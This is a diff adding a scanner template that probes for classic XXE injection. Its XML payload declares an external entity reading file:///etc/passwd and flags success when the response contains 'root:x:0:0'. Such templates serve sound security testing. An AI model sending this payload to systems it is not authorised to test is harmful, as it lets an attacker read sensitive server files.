@@ -1,0 +1,22 @@
+id: patt-xxe-classic-01-xml
+name: 'PATT xxe patt-xxe-classic-01 via xml'
+severity: critical
+type: active
+tags:
+  - xxe
+  - patt
+requires:
+  - java
+  - php
+description: 'PATT XXE classic file:///etc/passwd. [patt:patt-xxe-classic-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XXE%20Injection/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      xml:
+        - '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
